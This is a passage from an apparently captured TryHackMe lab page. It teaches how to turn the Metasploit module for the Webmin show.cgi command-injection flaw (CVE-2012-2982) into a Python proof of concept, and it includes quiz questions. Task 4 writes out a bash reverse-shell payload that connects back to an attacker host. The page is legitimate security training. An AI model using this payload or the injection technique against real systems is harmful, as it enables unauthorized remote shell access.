                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ****/****.***" value="">
                            <input type="hidden" value="3">
                            <input type="hidden" value="2">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
                            <i class="far fa-paper-plane"></i> Submit
                        </button>
                        </div>
                        <div class="room-task-input-hint">
                            <button type="button" class="btn btn-outline-dorange btn-noline task-hint" onclick="getHint(this)">
                        <i class="fal fa-lightbulb"></i> Hint
                      </button>
                        </div>
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>What program/command would be the most effective to use in this exploit?<br></p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ****** *****" value="">
                            <input type="hidden" value="4">
                            <input type="hidden" value="2">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
                            <i class="far fa-paper-plane"></i> Submit
                        </button>
                        </div>
                        <div class="room-task-input-hint">
                            <button type="button" class="btn btn-outline-dorange btn-noline task-hint" onclick="getHint(this)">
                        <i class="fal fa-lightbulb"></i> Hint
                      </button>
                        </div>
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-3">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse3">
                        <a class="card-link">
                            <span class="task-dropdown-title red">Task 3                             <span class="task-dropdown-icon"><i class="far fa-circle text-lgray"></i></span></span> Translating Metasploit module code
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse3" class="collapse " data-parent="#taskContent">
                        <div class="card-body task-incomplete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p><span>﻿</span><span style="font-family:&quot;Arial&quot;">﻿</span><span style="font-family:&quot;Arial&quot;">﻿</span><span style="font-family:&quot;Arial&quot;">Let's begin with analyzing the <a href="https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/unix/webapp/webmin_show_cgi_exec.rb" target="_blank">ruby source code</a> of the metasploit module. The source code can be broken up into three main functions; <b>initialize</b>, <b>check</b> and <b>exploit</b>. It would be most beneficial to inspect them separately.</span></p><p><b><u><span style="font-family:&quot;Arial&quot;;font-size:24px">Initialize</span></u></b></p><p><img style="width:526.98px;height:538.933px" src="./TryHackMe _ Intro PoC Scripting_files/8BIIdRx.png"><span style="font-family:&quot;Arial&quot;;font-size:16px"><br></span></p><p><span><span><span style="font-family:&quot;Arial&quot;"><span>There is little technicality in this function, but the purpose is to initialize the program with essentials. It begins with a description of the exploit, authors and reference sites of the shellcode and associated <a class="wK2mWAJj glossary-term" onclick="initPopOver(&#39;CVE&#39;, &#39;wK2mWAJj&#39;)">CVE</a>. This conversion is mostly unessential and can be skipped. </span></span></span></span></p><p><span><span><span style="font-family:&quot;Arial&quot;">There are a few simple parameters to take note of the </span><span style="font-family:&quot;Arial&quot;"><code class="code-81e98f88">update_info</code></span><span style="font-family:&quot;Arial&quot;"> function that we might need to consider converting</span></span></span></p><ul><li><div><p><span><span><span style="font-family:&quot;Arial&quot;"><code class="code-81e98f88">Space = 512</code></span><span style="font-family:&quot;Arial&quot;"> - maximum space in memory to store the payload</span></span></span></p></div></li><li><div><p><span><span><span style="font-family:&quot;Arial&quot;"><code class="code-81e98f88">PayloadType = cmd</code></span><span style="font-family:&quot;Arial&quot;"> - ensures that the payload the exploit uses is the </span><span style="font-family:&quot;Arial&quot;"><code class="code-81e98f88">cmd</code></span></span></span></p></div></li></ul><p><span><span><span style="font-family:&quot;Arial&quot;">And the </span><span style="font-family:&quot;Arial&quot;"><code class="code-81e98f88">register_options</code></span><span style="font-family:&quot;Arial&quot;"> function</span></span></span></p><ul><li><div><p><span><span><span style="font-family:&quot;Arial&quot;"><code class="code-81e98f88">RPORT(10000)</code></span><span style="font-family:&quot;Arial&quot;"> - sets the target port</span></span></span></p></div></li><li><div><p><span><span><span style="font-family:&quot;Arial&quot;"><code class="code-81e98f88">'SSL', [true, 'Use SSL', true]</code></span><span style="font-family:&quot;Arial&quot;"> - whether or not the site uses HTTPS (this didnt so set to false)</span></span></span></p></div></li><li><div><p><span><span><span style="font-family:&quot;Arial&quot;"><code class="code-81e98f88">'USERNAME', [true, 'Webmin Username']</code></span><span style="font-family:&quot;Arial&quot;"> - accepts the username</span></span></span></p></div></li><li><div><p><span><span><span style="font-family:&quot;Arial&quot;"><code class="code-81e98f88">'PASSWORD', [true, 'Webmin Password']</code></span><span style="font-family:&quot;Arial&quot;"> - accepts the password<br></span></span></span></p></div></li></ul><p><span style="font-family:&quot;Arial&quot;;font-size:16px"></span></p><p><u><span style="font-family:&quot;Arial&quot;;font-size:18px">Information to convert</span></u><br></p><ul><li><b><span style="font-family:&quot;Arial&quot;;font-size:16px">payload type: cmd or the system shell</span></b></li><li><span style="font-family:&quot;Arial&quot;;font-size:16px"><b>placeholder for the username and passwor</b>d</span></li><li><span style="font-family:&quot;Arial&quot;;font-size:16px"><b><span>RPORT: the website is on the default <a class="jA2OnG9d glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;jA2OnG9d&#39;)">HTTP</a> port 80 instead of 10000</span></b><br></span></li></ul><p><span style="font-family:&quot;Arial&quot;">Other information such as memory allocation is done automatically when using python so we can ignore this. The website does not use TLS so we'll have to note this in the POST request.</span><u><b><span style="font-family:&quot;Arial&quot;;font-size:24px"><br></span></b></u></p><p><u><b><span style="font-family:&quot;Arial&quot;;font-size:24px">Check</span></b></u></p><p><img style="width:523.95px;height:582.053px" src="./TryHackMe _ Intro PoC Scripting_files/LTiBRZL.png"><span style="font-family:&quot;Arial&quot;"><br></span></p><p><span style="font-family:&quot;Arial&quot;">The purpose of this function is to verify that the target is vulnerable to CVE-2012-2982. As this function only exists to verify the vulnerability, it is expendable in our custom script. Let's breakdown this function line by line (I'll be skipping the print statements)<br></span></p><ul><li><code>peer = "#{rhost}:#{rport}"</code><span><span><span></span></span><span><span> <span style="font-family:&quot;Arial&quot;">- reserves space for the target IP and port</span></span></span></span></li><li><span><span><span><span style="font-family:&quot;Arial&quot;"></span></span></span></span><code>data = "page=%2F&amp;user=#{datastore['USERNAME']}&amp;pass=#{datastore['PASSWORD']}"</code><span><span><span><span><span></span></span><span><span> <span style="font-family:&quot;Arial&quot;">- stores the URL that handles the login request</span></span></span></span></span></span></li><li><span><span><span><span><span><span style="font-family:&quot;Arial&quot;"></span></span></span></span></span></span><code>res = send_request_cgi({'method'  =&gt; 'POST', 'uri'     =&gt; "/session_login.cgi", 'cookie'  =&gt; "testing=1", 'data'    =&gt; data}, 25)</code><span><span><span><span style="font-family:&quot;Arial&quot;"><span> - sends an <a class="YORwIY40 glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;YORwIY40&#39;)">HTTP</a> POST request to login with compromised credentials </span></span><br></span></span></span></li></ul><p><span><span><span><span><span></span></span></span></span></span></p><div><span><span><span style="font-family:&quot;Arial&quot;">
</span></span></span></div><p><span style="font-family:&quot;Arial&quot;"></span></p><p><span style="font-family:&quot;Arial&quot;">The beginning portion of this function establishes the flow of the rest of the script<br></span></p><ol><li><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">sets target IP and port</span></span></li><li><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span>obtains Webmin login page <a class="jRky2SMT glossary-term" onclick="initPopOver(&#39;URI&#39;, &#39;jRky2SMT&#39;)">URI</a></span><br></span></span></span></li><li><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">sends a POST request to the server<br></span></span></span></span></li></ol><p><span style="font-family:&quot;Arial&quot;"> Here we simply have elements of a POST request, the login page, test cookie, and credentials. We know we need <b>authenticated</b> credentials in order to use this exploit, the POST request logs us in and assigns us a unique cookie to verify our local access privileges on the target and communicate as if we had a graphical interface. In fact, we can use the developer tools in our browser to verify the information. </span></p><p><img style="width:725.35px;height:529.184px" src="./TryHackMe _ Intro PoC Scripting_files/Kpzn6C2.png"><span style="font-family:&quot;Arial&quot;"><br></span></p><p><span style="font-family:&quot;Arial&quot;">We can verify the contents of the POST request, the login data <i>page=%2F&amp;user=user1&amp;pass=1user</i> (%2F is <a href="https://www.w3schools.com/tags/ref_urlencode.ASP" target="_blank">an equivalent</a><span> of forward slash /) and the <a class="mkx8E8qS glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;mkx8E8qS&#39;)">HTTP</a> response headers.</span><br></span></p><p><span style="font-family:&quot;Arial&quot;">The next section of the check function can be intimidating to beginners, but it's more simple than it appears. All this section does is format the unique cookie to exclude unnecessary text and generate a random string.</span></p><ul><li><code>if res and res.code == 302 and res.get_cookies =~ /sid/</code><span style="font-family:&quot;Arial&quot;"><span> - if statement to continue if the <a class="UU7ba5Ly glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;UU7ba5Ly&#39;)">HTTP</a> response code is 302 and if the cookie equals the value of sid, session ID</span></span></li><li><span style="font-family:&quot;Arial&quot;"></span><code>session = res.get_cookies.split("sid=")[1].split(";")[0]</code><span style="font-family:&quot;Arial&quot;"><span> - formats the cookie into a readable string based on the Set-Cookie header in the <a class="Dq4gdzak glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;Dq4gdzak&#39;)">HTTP</a> response</span></span></li><li><span style="font-family:&quot;Arial&quot;"></span><code>command = "echo #{rand_text_alphanumeric(rand(5) + 5)}"</code><span style="font-family:&quot;Arial&quot;"> - generates a random string of 5 alphanumeric characters to use as invalid input<br></span></li></ul><p><span style="font-family:&quot;Arial&quot;">This part has some important duties within the script. We verify that</span></p><ol><li><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">the first POST request responds with a 302 (found) status code</span></span></li><li><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">the cookies are labeled as sid</span></span></li><li><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">format the cookies for excess text</span></span></li><li><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">generate the invalid input to pipe into the malicious command<br></span></span></li></ol><p><span style="font-family:&quot;Arial&quot;">The most important information in this section is the format of the unique cookie and generating a random alphanumeric string. </span></p><p><span style="font-family:&quot;Arial&quot;">The cookie is formatted by reading the output of the <i><a href="https://www.geeksforgeeks.org/http-headers-set-cookie/" target="_blank">Set-Cookie</a></i> header. The actual cookie is a random alphanumeric string but there is other information (the name and path) that is apart of the header, this line of code simply gets rid of the excess information and stores the alphanumeric value. From the developer tools, we see the name sid proceeds the actual value, so the method <i><a href="https://www.geeksforgeeks.org/ruby-string-split-method-with-examples/" target="_blank">split</a></i> is used to <a href="https://spin.atomicobject.com/2007/11/01/ruby-string-split/" target="_blank">split</a> the text at "sid=" and returns an array, storing the alphanumeric value and the remaining text. It's then repeated to split at ";" and return an array with no elements, leaving only the alphanumeric cookie value.</span></p><p><span style="font-family:&quot;Arial&quot;">The <i>command</i> variable uses echo to print five <a href="https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf%2FExploit:rand_text_alphanumeric" target="_blank">random alphanumeric</a> characters to be used as invalid input to pipe to the malicious command, generating a random alphanumeric string.<br></span></p><p><u><span style="font-family:&quot;Arial&quot;;font-size:18px">Information to convert</span></u></p><ul><li><span style="font-family:&quot;Arial&quot;"><span><strong><span>the login page <a class="tpmwqDUF glossary-term" onclick="initPopOver(&#39;URI&#39;, &#39;tpmwqDUF&#39;)">URI</a> data </span></strong></span></span><span style="font-family:&quot;Arial&quot;"><span><strong><span style="font-family:&quot;Arial&quot;"><span><strong>(credentials and login page file)</strong></span></span></strong></span></span></li><li><span style="font-family:&quot;Arial&quot;"><span><strong><span>POST request sending the <a class="8eSRYjDU glossary-term" onclick="initPopOver(&#39;URI&#39;, &#39;8eSRYjDU&#39;)">URI</a> data</span><br></strong></span></span></li><li><span style="font-family:&quot;Arial&quot;"><span><strong>format the cookie<br></strong></span></span></li><li><span style="font-family:&quot;Arial&quot;"><span><strong><span><strong><span><a class="iZaTiuFv glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;iZaTiuFv&#39;)">HTTP</a> response code and the session id is not empty</span></strong></span></strong></span></span></li><li><span style="font-family:&quot;Arial&quot;"><span><strong><span><strong><span style="white-space:pre">generate five random characters</span></strong></span></strong></span></span></li></ul><p><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"></span>The second request simply checks if the target is vulnerable to the exploit, we'll discuss this in more detail below.<br></span></p><p><u><b><span style="font-family:&quot;Arial&quot;;font-size:24px">Exploit</span></b></u></p><p><img style="width:517.95px;height:575.923px" src="./TryHackMe _ Intro PoC Scripting_files/Ce0MQmm.png"><span style="font-family:&quot;Arial&quot;"><br></span></p><p><span style="font-family:&quot;Arial&quot;">You may have noticed some similarities between the check and exploit functions, they are identical aside from the fact that the exploit function sends the actual payload. The initial POST request, formatting cookies and second request to send the payload are identical to the check function. This makes this script easier for us as we can condense redundant code.</span></p><p><span style="font-family:&quot;Arial&quot;">The main difference in this exploit is the change of the <i>command</i> variable. We can see with </span><code><a href="https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/EncodedPayload" target="_blank">payload.encoded</a></code><span style="font-family:&quot;Arial&quot;"> that instead of merely testing if the website is vulnerable, we are sending data (the shell) over a network back to our attacking machine. In order for data to be properly sent through a URL, some exploits require <a href="https://www.w3schools.com/tags/ref_urlencode.ASP" target="_blank">URL encoding</a>. Here metasploit is using it as insurance because as we'll see in the next task, in this scenario it doesn't need to be encoded <b>manually</b> because the payload does not break in transit. <br></span></p><p><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">Lets discuss the second request. The module does not specify the type of request, therefore using the default GET method. It sends a request with the authenticated cookie to the file that houses the vulnerability <i>show.cgi</i> and enters the invalid input, piping it with | to the malicious command, the system shell. As metasploit automatically establishes a socket connection between the target and attacker, we'll have include a line to open a socket on the victim in order to send the system shell back to us. <br></span></span></p><p><u><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;;font-size:18px">Information to convert</span></span></u></p><ul><li><b><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="white-space:pre"><span style="white-space:pre">store the system shell with a function, encode it and send it back via socket</span></span></span></span></b></li><li><b><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="white-space:pre"><span style="white-space:pre"></span></span></span></span><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="white-space:pre"><span style="white-space:pre"><span style="white-space:pre">send a GET or POST request with compromised cookie for show.cgi with invalid input piping it to the malicious command </span></span></span></span></span></b></li></ul><p><span style="font-family:&quot;Arial&quot;">At this point we know exactly what information we need in order to convert this ruby code to python, lets review everything so far.<br></span></p><p><u><b><span style="font-family:&quot;Arial&quot;;font-size:24px">Information to convert</span></b></u></p><ul><li><b><span style="font-family:&quot;Arial&quot;;font-size:16px">payload type: cmd or system shell</span></b></li><li><span style="font-family:&quot;Arial&quot;"><span><strong><span>the login page <a class="jGCFib4j glossary-term" onclick="initPopOver(&#39;URI&#39;, &#39;jGCFib4j&#39;)">URI</a> data (credentials, receiving port and login page file)</span><br></strong></span></span></li><li><span style="font-family:&quot;Arial&quot;"><span><strong></strong></span></span><span style="font-family:&quot;Arial&quot;"><span><strong><span>POST request sending the <a class="WqFxoNj1 glossary-term" onclick="initPopOver(&#39;URI&#39;, &#39;WqFxoNj1&#39;)">URI</a> data</span></strong></span></span></li><li><span style="font-family:&quot;Arial&quot;"><span></span></span><span style="font-family:&quot;Arial&quot;"><span><strong>format the cookie</strong></span></span><span style="font-family:&quot;Arial&quot;"><span><br></span></span></li><li><span style="font-family:&quot;Arial&quot;"><span></span></span><span style="font-family:&quot;Arial&quot;"><span><strong><span><strong><span>verify <a class="Ph4NlifR glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;Ph4NlifR&#39;)">HTTP</a> response code and the session id is not empty</span></strong></span></strong></span></span><span style="font-family:&quot;Arial&quot;"><b>, print statement to verify success</b><br></span></li><li><span style="font-family:&quot;Arial&quot;"></span><span style="font-family:&quot;Arial&quot;"><span><strong><span><strong><span style="white-space:pre">generate five random characters</span></strong></span></strong></span></span></li><li><b><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="white-space:pre"><span style="white-space:pre">store the system shell with a function, encode it and send it back via socket</span></span></span></span></b></li><li><b><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="white-space:pre"><span style="white-space:pre"></span></span></span></span><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="white-space:pre"><span style="white-space:pre"><span style="white-space:pre">send a GET or POST request with compromised cookie for show.cgi with invalid input piping it to the malicious command </span></span></span></span></span></b><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="white-space:pre"><span style="white-space:pre"></span></span></span></span><span style="font-family:&quot;Arial&quot;"><span><strong><span><strong><span style="white-space:pre"></span></strong></span></strong></span></span><span style="font-family:&quot;Arial&quot;;font-size:16px"></span><span style="font-family:&quot;Arial&quot;"></span></li></ul><p><span style="font-family:&quot;Arial&quot;">At first this module may have seemed intimidating, but as we've broken down in this task it's rather simple. All it's really doing is sending a couple POST requests. While some penetration testers may want to first verify the target is vulnerable to a particular exploit, it's not always necessary if the goal is a simple and quick privilege escalation such as this example. You may sometimes find among proof of concept code that it contains unnecessary weight to what could be a simple, quick script. </span><br></p><p></p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom red">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                What's the original disclosure date of this exploit?<br>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ********* * ****" value="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="3">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
                            <i class="far fa-paper-plane"></i> Submit
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p><span>What <a class="B8HRnBm3 glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;B8HRnBm3&#39;)">HTTP</a> response code do we expect after the initial POST request?</span><br></p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***" value="">
                            <input type="hidden" value="2">
                            <input type="hidden" value="3">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
                            <i class="far fa-paper-plane"></i> Submit
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>What does sid stand for and what is it's purpose?<br></p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ******* **, **************" value="">
                            <input type="hidden" value="3">
                            <input type="hidden" value="3">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
                            <i class="far fa-paper-plane"></i> Submit
                        </button>
                        </div>
                        <div class="room-task-input-hint">
                            <button type="button" class="btn btn-outline-dorange btn-noline task-hint" onclick="getHint(this)">
                        <i class="fal fa-lightbulb"></i> Hint
                      </button>
                        </div>
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>In the check function, what is it doing to the cookies?<br></p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ******" value="">
                            <input type="hidden" value="4">
                            <input type="hidden" value="3">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
                            <i class="far fa-paper-plane"></i> Submit
                        </button>
                        </div>
                        <div class="room-task-input-hint">
                            <button type="button" class="btn btn-outline-dorange btn-noline task-hint" onclick="getHint(this)">
                        <i class="fal fa-lightbulb"></i> Hint
                      </button>
                        </div>
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>In the second request of the check function, what <b>method</b> is piped into the command?<br></p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: **********************" value="">
                            <input type="hidden" value="5">
                            <input type="hidden" value="3">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
                            <i class="far fa-paper-plane"></i> Submit
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-4">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse4">
                        <a class="card-link">
                            <span class="task-dropdown-title red">Task 4                             <span class="task-dropdown-icon"><i class="far fa-circle text-lgray"></i></span></span> Converting Ruby to Python
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse4" class="collapse " data-parent="#taskContent">
                        <div class="card-body task-incomplete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p><span style="font-family:&quot;Arial&quot;">﻿</span><span style="font-family:&quot;Arial&quot;"><span>This exploit <a class="IzYcVt8V glossary-term" onclick="initPopOver(&#39;PoC&#39;, &#39;IzYcVt8V&#39;)">PoC</a> is written in Python</span></span><span style="font-family:&quot;Arial&quot;"></span><span style="font-family:&quot;Arial&quot;">, but you can use your preferred language as an additional challenge. For the most part, the syntax will be relatively the same format with </span><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">the POST requests, cookie formatting, and if statement</span>. The main differences in syntax will be the random character and payload functions.<br></span></p><p><span style="font-family:&quot;Arial&quot;">Lets review exactly what we need to convert again.</span></p><ul><li><b><span style="font-family:&quot;Arial&quot;;font-size:16px">payload type: cmd or system shell</span></b></li><li><span style="font-family:&quot;Arial&quot;"><span><strong><span>the login page <a class="lzTc03xJ glossary-term" onclick="initPopOver(&#39;URI&#39;, &#39;lzTc03xJ&#39;)">URI</a> data (credentials, receiving port and login page file)</span><br></strong></span></span></li><li><span style="font-family:&quot;Arial&quot;"><span><strong></strong></span></span><span style="font-family:&quot;Arial&quot;"><span><strong><span>POST request sending the <a class="t4ull4be glossary-term" onclick="initPopOver(&#39;URI&#39;, &#39;t4ull4be&#39;)">URI</a> data</span></strong></span></span></li><li><span style="font-family:&quot;Arial&quot;"><span></span></span><span style="font-family:&quot;Arial&quot;"><span><strong>format the cookie</strong></span></span><span style="font-family:&quot;Arial&quot;"><span><br></span></span></li><li><span style="font-family:&quot;Arial&quot;"><span></span></span><span style="font-family:&quot;Arial&quot;"><span><strong><span><strong><span>verify <a class="QywoRDy0 glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;QywoRDy0&#39;)">HTTP</a> response code and the session id is not empty</span></strong></span></strong></span></span><span style="font-family:&quot;Arial&quot;"><b>, print statement to verify success</b><br></span></li><li><span style="font-family:&quot;Arial&quot;"></span><span style="font-family:&quot;Arial&quot;"><span><strong><span><strong><span style="white-space:pre">generate five random alphanumeric characters</span></strong></span></strong></span></span></li><li><b><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="white-space:pre"><span style="white-space:pre">store the system shell with a function, encode it and send it back via socket</span></span></span></span></b></li><li><b><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="white-space:pre"><span style="white-space:pre"></span></span></span></span><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="white-space:pre"><span style="white-space:pre"><span style="white-space:pre">send a GET or POST request with compromised cookie for show.cgi with invalid input piping it to the malicious command </span></span></span></span></span></b></li></ul><p><span style="font-family:&quot;Arial&quot;"></span></p><p><span style="font-family:&quot;Arial&quot;">Similar to the metasploit module, we can dissect our exploit into three main parts; <b>initialize payload, login, exploit</b>. <br></span></p><p><span style="font-family:&quot;Arial&quot;"><u><b><span style="font-size:24px">Initialize Payload</span></b></u><br></span></p><p><span style="font-family:&quot;Arial&quot;">The most important task here is to enable python to execute the system shell <i>/bin/sh </i>or<i> /bin/bash</i>. Python has numerous ways to execute system programs natively but remember, we have the ability of <b>arbitrary command execution</b>, meaning that we can use whatever <b>command</b><span> (not just python code) necessary to establish a reverse shell including with Python, Bash, Ruby, netcat, <a class="yStW4mUw glossary-term" onclick="initPopOver(&#39;PHP&#39;, &#39;yStW4mUw&#39;)">PHP</a>, socat and a plethora of other commands available to us. </span><br></span></p><p><span style="font-family:&quot;Arial&quot;">We can examine different examples and methods applicable to our script. </span><span style="font-family:&quot;Arial&quot;">You can view reverse shell examples in python and other languages/commands in the <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" target="_blank">PayloadsAllTheThings</a> repository as well as <a href="https://gtfobins.github.io/#+reverse%20shell" target="_blank">gtfobins</a> and <a href="https://github.com/D4Vinci/One-Lin3r" target="_blank">One-Lin3r</a>. I encourage you to experiment with the final script and test different reverse shells to see what does and doesn't work. <br></span></p><span style="font-family:&quot;Arial&quot;"></span><p></p><p><span style="font-family:&quot;Arial&quot;"></span><span style="font-family:&quot;Arial&quot;">As discussed in more detail below, the simplest way to open a connection to the attacker and send the shell will be to run a </span><code>bash</code><span style="font-family:&quot;Arial&quot;"> command executing a reverse shell. </span><br><span style="font-family:&quot;Arial&quot;"></span></p><p><span style="font-family:&quot;Arial&quot;"></span></p><p><span style="font-family:&quot;Arial&quot;">Our initialization will be </span><code>payload = f"bash -c 'exec bash -i &amp;&gt;/dev/tcp/{lhost}/{lport}&lt;&amp;1'"</code><span><span></span></span><span></span></p><ul><li><strike><span style="font-family:&quot;Arial&quot;"><b><span style="font-family:&quot;Arial&quot;;font-size:16px">payload type: cmd or system shell</span></b></span></strike></li></ul><p><span style="font-family:&quot;Arial&quot;"><u><b><span style="font-size:24px">Login</span></b></u><br></span></p><p><span style="font-family:&quot;Arial&quot;"></span><span style="font-family:&quot;Arial&quot;"><span><span>In some cases, especially when researching, it is necessary to check if the target is vulnerable to the exploit by sending a test command like the author of the metasploit module included. For the purposes of this room because we already confirmed the <a class="9nDuQkkm glossary-term" onclick="initPopOver(&#39;CVE&#39;, &#39;9nDuQkkm&#39;)">CVE</a>, we can condense the steps to login once, return if </span></span><span><span>302 status code</span></span><span> and return the </span><span><span>sid</span></span><span> cookie to use in the payload POST request. The request should be fairly simple and we can</span> go down our list item by item, using the </span><code><a href="https://requests.readthedocs.io/en/master/user/quickstart/" target="_blank">requests</a></code><span style="font-family:&quot;Arial&quot;"> library<br></span></p><ul><li><span style="font-family:&quot;Arial&quot;"><span><strong><span>the login page <a class="OywwLGj4 glossary-term" onclick="initPopOver(&#39;URI&#39;, &#39;OywwLGj4&#39;)">URI</a> data (credentials, receiving port and login page file)</span><br></strong></span></span></li><li><span style="font-family:&quot;Arial&quot;"><span><strong></strong></span></span><span style="font-family:&quot;Arial&quot;"><span><strong><span>POST request sending the <a class="58aDI1u3 glossary-term" onclick="initPopOver(&#39;URI&#39;, &#39;58aDI1u3&#39;)">URI</a> data</span></strong></span></span></li><li><span style="font-family:&quot;Arial&quot;"><span></span></span><span style="font-family:&quot;Arial&quot;"><span><strong>format the cookie</strong></span></span><span style="font-family:&quot;Arial&quot;"><span><br></span></span></li><li><span style="font-family:&quot;Arial&quot;"><span></span></span><span style="font-family:&quot;Arial&quot;"><span><strong><span><strong><span>verify <a class="Tw5NIF8a glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;Tw5NIF8a&#39;)">HTTP</a> response code and the session id is not empty</span></strong></span></strong></span></span><span style="font-family:&quot;Arial&quot;"><b>, print statement to verify success</b></span></li></ul><p><span style="font-family:&quot;Arial&quot;"></span></p><p><span style="font-family:&quot;Arial&quot;">POST requests in python can send data to a server via </span><span style="color:rgb(0, 0, 0);font-family:&quot;Arial&quot;;font-size:15px;font-style:normal;font-variant-ligatures:normal;font-variant-caps:normal;font-weight:400;letter-spacing:normal;text-align:left;text-indent:0px;text-transform:none;white-space:normal;word-spacing:0px;-webkit-text-stroke-width:0px;background-color:rgb(255, 255, 255);text-decoration-style:initial;text-decoration-color:initial;display:inline;float:none">a dictionary, list of tuples, bytes or a file object. We only need three items to send as data, the page, username, and password. From the developer tools we know the exact labels of each of these; page, user, and pass.</span></p><p><code>data = {'page' : "%2F", 'user' : "user1", 'pass' : "1user"}</code><span style="color:rgb(0, 0, 0);font-family:&quot;Arial&quot;;font-size:15px;font-style:normal;font-variant-ligatures:normal;font-variant-caps:normal;font-weight:400;letter-spacing:normal;text-align:left;text-indent:0px;text-transform:none;white-space:normal;word-spacing:0px;-webkit-text-stroke-width:0px;background-color:rgb(255, 255, 